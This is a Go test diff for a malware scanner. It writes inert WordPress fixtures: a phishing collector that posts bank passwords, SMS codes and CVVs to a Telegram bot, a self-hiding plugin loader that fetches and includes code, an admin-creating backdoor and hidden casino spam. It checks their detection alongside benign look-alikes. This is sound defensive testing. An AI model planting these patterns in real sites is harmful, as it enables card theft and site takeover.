@@ -731,3 +731,102 @@ func TestFleetHiddenAndLogsPHP(t *testing.T) {
 		t.Errorf("content check: %+v", d)
 	}
 }
+
+// server1 (2026-10-28): a bank phishing kit, casino SEO spam, fake plugins
+// and a WooCommerce-named loader, with no finding (101 files). Inert
+// fixtures built the same way; plugins and pages that look alike stay clean.
+func TestFleetPhishingCasinoAndLoaders(t *testing.T) {
+	s := newScanner(t)
+	home := t.TempDir()
+	put := func(rel, body string) string {
+		p := filepath.Join(home, "public_html", rel)
+		os.MkdirAll(filepath.Dir(p), 0o755)
+		os.WriteFile(p, []byte(body), 0o644)
+		return p
+	}
+	check := func(p string) *Detection {
+		t.Helper()
+		info, _ := os.Lstat(p)
+		d, err := s.CheckFile(p, info, s.Settings.Get().Scanner)
+		if err != nil && err != ErrTrusted {
+			t.Fatal(err)
+		}
+		return d
+	}
+	pieces := strings.Repeat("$k = 'wp'.'_fo'.'ot'.'er'; ", 25)
+	hashNames := ""
+	for i := range 12 {
+		hashNames += fmt.Sprintf("$var_%032x = 'x'; ", i)
+	}
+	collector := "<?php\n$cfg = ['tg_token' => 'inert', 'tg_chat' => '1'];\n$ip = $_SERVER['REMOTE_ADDR'];\n" +
+		"$msg = 'clave: ' . $_POST['clave'] . ' sms: ' . $_POST['sms'] . ' cvv: ' . $_POST['cvv'];\n" +
+		"file_get_contents('https://api.telegram.org/bot' . $cfg['tg_token'] . '/sendMessage?text=' . urlencode($msg));\n"
+	casino := strings.Repeat("<li><a href=\"https://example.invalid/c\">online casino free spins no deposit</a> best slots bonus</li>\n", 16)
+	hidden := "<section style=\"position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0)\"><ul>\n" + casino + "</ul></section>\n"
+	doorway := strings.Repeat("<link rel=\"stylesheet\" href=\"/wp-content/themes/t/style.css\">\n", 5) +
+		strings.Repeat("<p>Claim free spins and a deposit bonus at the best online casino with no deposit slots.</p>\n", 10)
+	put("kit/acciones.php", collector)
+	put("wp-content/mu-plugins/section.html", hidden)
+	for rel, sig := range map[string]string{
+		"wp-content/plugins/fast-checker-572d/inc/class-handler.php":   "PHP.Obfuscated.SplitStrings",
+		"wp-content/plugins/woocommerce_inputs/woocommerce-load.php":   "PHP.Obfuscated.HashNames",
+		"wp-content/plugins/woocommerce_inputs/woocommerce_inputs.php": "PHP.Backdoor.TelegramDeadDrop",
+		"wp-content/plugins/woocommerce_inputs/fhelpers.php":           "PHP.SEOSpam.RemoteFooterLinks",
+		"wp-content/plugins/woo_inputs/woocommerce_inputs.php":         "PHP.Backdoor.HiddenPluginLoader",
+		"kit/acciones.php":                                    "Phishing.Collector.Telegram",
+		"kit/index.html":                                      "Phishing.KitPage",
+		"wp-content/mu-plugins/section.html":                  "HTML.SEOSpam.HiddenGambling",
+		"wp-content/mu-plugins/section.php":                   "PHP.SEOSpam.HiddenGamblingPrinter",
+		"100-free-spins-no-deposit.html":                      "HTML.SEOSpam.GamblingDoorway",
+		"wp-content/uploads/0123456789abcdef0123456789abcdef": "Dropper.Base64URL",
+	} {
+		var body string
+		switch sig {
+		case "PHP.Obfuscated.SplitStrings":
+			body = "<?php\nclass H { function __construct() { " + pieces + " add_action($k, [$this, 'p']); } }\n"
+		case "PHP.Obfuscated.HashNames":
+			body = "<?php\n" + hashNames + "\n$r = wp_remote_get('https://example.invalid/');\n"
+		case "PHP.Backdoor.TelegramDeadDrop":
+			body = "<?php\n$page = wp_remote_get('https://t.me/s/inert_channel');\n$d = 'x';\nwp_insert_user(['user_login' => 'inert', 'role' => 'administrator']);\n"
+		case "PHP.SEOSpam.RemoteFooterLinks":
+			body = "<?php\nadd_action('wp_footer', function () { $r = wp_remote_get('https://example.invalid/api/links', ['sslverify' => false]); echo wp_remote_retrieve_body($r); });\n"
+		case "PHP.Backdoor.HiddenPluginLoader":
+			body = "<?php\nadd_filter('all_plugins', function ($p) { unset($p[plugin_basename(__FILE__)]); return $p; });\n" +
+				"add_filter('plugin_action_links_' . plugin_basename(__FILE__), '__return_empty_array');\n" +
+				"$z = wp_remote_get('https://example.invalid/wp-plugin/?update-check');\nfile_put_contents('/tmp/inert.zip', wp_remote_retrieve_body($z));\n$f = __DIR__ . '/r.php';\ninclude $f;\n"
+		case "Phishing.Collector.Telegram":
+			body = collector
+		case "Phishing.KitPage":
+			body = "<form action=\"send.php\"><input name=\"clave\" type=\"password\"></form>\n<script>const BACKEND='acciones.php';fetch(BACKEND+'?accion=enviar',{method:'POST'})</script>\n"
+		case "HTML.SEOSpam.HiddenGambling":
+			body = hidden
+		case "PHP.SEOSpam.HiddenGamblingPrinter":
+			body = "<?php\n$file = __DIR__ . '/section.html';\n$print = function () use ($file) { readfile($file); };\nadd_action('wp_footer', $print);\n"
+		case "HTML.SEOSpam.GamblingDoorway":
+			body = doorway
+		case "Dropper.Base64URL":
+			body = base64.StdEncoding.EncodeToString([]byte("https://example.invalid/inert"))
+		}
+		if d := check(put(rel, body)); d == nil || d.Signature != sig || d.Category != CatVirus {
+			t.Errorf("%s: want %s, got %+v", rel, sig, d)
+		}
+	}
+	// Look-alikes: a one-time-code plugin sending by Telegram, a casino
+	// site's own page with a hidden menu, a page cache, a footer link
+	// plugin with its own links, a hex-named cache file, a login page.
+	for rel, body := range map[string]string{
+		"wp-content/plugins/tg-otp/otp.php": "<?php\n$chat = get_option('chat_id');\n$ip = $_SERVER['REMOTE_ADDR'];\n$otp = wp_rand(100000, 999999);\n" +
+			"wp_remote_post('https://api.telegram.org/bot' . get_option('token') . '/sendMessage', ['body' => ['chat_id' => $chat, 'text' => 'Your OTP code for login: ' . $otp . ' (sms fallback, pin reset, password reset)']]);\n",
+		"casino-reviews.html": "<nav style=\"display:none\" id=\"m\">" + strings.Repeat("<a href=\"/casino-reviews/\">Casino reviews</a> <a href=\"/free-spins/\">Free spins</a>\n", 10) + "</nav>\n" +
+			"<a class=\"skip\" style=\"position:absolute;left:-10000px;width:1px;height:1px\" href=\"#main\">Skip to content</a>\n" + strings.Repeat("<p>Our online casino reviews compare free spins, slots and the welcome bonus of each casino.</p>\n", 10) +
+			"<a href=\"/a\">a</a><a href=\"/b\">b</a><a href=\"/c\">c</a>\n",
+		"wp-content/cache/page/best-casino-bonus.html":      doorway,
+		"wp-content/plugins/links/links.php":                "<?php\nadd_action('wp_footer', function () { echo '<a href=\"https://example.test/partner\">Partner</a>'; });\n",
+		"wp-content/cache/ffffffffffffffffffffffffffffffff": "a:1:{s:4:\"html\";s:5:\"inert\";}",
+		"login.html": "<form action=\"wp-login.php\" method=\"post\"><input type=\"password\" name=\"pwd\"></form>\n",
+	} {
+		if d := check(put(rel, body)); d != nil {
+			t.Errorf("%s flagged: %+v", rel, d)
+		}
+	}
+}
